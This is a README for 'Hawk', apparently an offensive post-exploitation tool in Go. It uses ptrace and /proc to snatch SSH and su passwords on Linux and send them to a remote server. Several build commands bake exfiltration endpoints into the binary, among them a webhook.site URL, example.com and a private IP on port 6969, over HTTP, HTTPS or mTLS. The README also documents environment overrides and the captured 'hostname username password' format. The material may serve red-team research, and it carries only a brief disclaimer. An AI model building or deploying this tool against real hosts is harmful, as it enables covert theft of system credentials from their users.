<h1 align="center">
<br>
<img src='https://uploads-ssl.webflow.com/648e4ba94fdf34ba5288e0c3/65d950ef50097152325d639e_hawk%20small.png' height="375" border="2px solid #555">
<br>
Hawk
</h1>

Hawk is a lightweight Golang tool designed to monitor the `sshd` and `su` services for passwords on Linux systems. It reads the content of the proc directory to capture events, and ptrace to trace syscalls related to password-based authentication.

## Blog Post
https://www.prodefense.io/blog/hawks-prey-snatching-ssh-credentials

## Features

- Monitors SSH and SU commands for passwords
- Reads memory from sshd and su syscalls without writing to traced processes
- Exfiltrates passwords via HTTP, HTTPS, or mTLS to a specified server/webhook
- Compile-time configuration via ldflags
- Runtime environment variable overrides
- Stdout fallback when no server configured

## Build

### Basic Build
```bash
GOOS=linux GOARCH=amd64 CGO_ENABLED=0 go build -o hawk
```

### Build with HTTP Server Configuration
```bash
GOOS=linux GOARCH=amd64 CGO_ENABLED=0 go build -ldflags "-X main.serverURL=http://example.com:6969 -X main.protocol=http" -o hawk
```

### Build with HTTPS/Webhook Configuration
```bash
GOOS=linux GOARCH=amd64 CGO_ENABLED=0 go build -ldflags "-X main.serverURL=https://webhook.site/your-webhook-id -X main.protocol=https" -o hawk
```

### Build with mTLS Configuration
```bash
GOOS=linux GOARCH=amd64 CGO_ENABLED=0 go build -ldflags "-X main.serverURL=https://example.com:443 -X main.protocol=mtls -X main.mtlsCertPath=/path/to/client.crt -X main.mtlsKeyPath=/path/to/client.key -X main.mtlsCACertPath=/path/to/ca.crt" -o hawk
```

## Usage

### Compile-Time Configuration
Configure the server URL and protocol at build time using ldflags:
- `serverURL`: The server/webhook URL (e.g., "https://webhook.site/xxx" or "http://example.com:6969")
- `protocol`: Communication protocol - "http", "https", or "mtls"

### Runtime Configuration
Override compile-time settings using environment variables:
- `HAWK_SERVER_URL`: Override the server URL
- `HAWK_PROTOCOL`: Override the protocol (http, https, mtls)

### Default Behavior
If no server URL is configured, Hawk will print credentials to stdout in the format:
```
hostname=xxx username=xxx password=xxx
```

### Examples

**Webhook Example:**
```bash
go build -ldflags "-X main.serverURL=https://webhook.site/f436b722-284a-4f5f-9aa8-836677e56dcb -X main.protocol=https" -o hawk
```

**HTTP Server Example:**
```bash
go build -ldflags "-X main.serverURL=http://192.168.1.100:6969 -X main.protocol=http" -o hawk
```

**mTLS Example:**
```bash
go build -ldflags "-X main.serverURL=https://secure.example.com:443 -X main.protocol=mtls -X main.mtlsCertPath=/etc/hawk/client.crt -X main.mtlsKeyPath=/etc/hawk/client.key -X main.mtlsCACertPath=/etc/hawk/ca.crt" -o hawk
```

## Limitations

- Linux systems with ptrace enabled
- `/proc` filesystem must be mounted

## Disclaimer

This tool is intended for ethical and educational purposes only. Unauthorized use is prohibited. Use at your own risk.

## Credits

Hawk is inspired by the work of [blendin](https://github.com/blendin) and their tool [3snake](https://github.com/blendin/3snake).
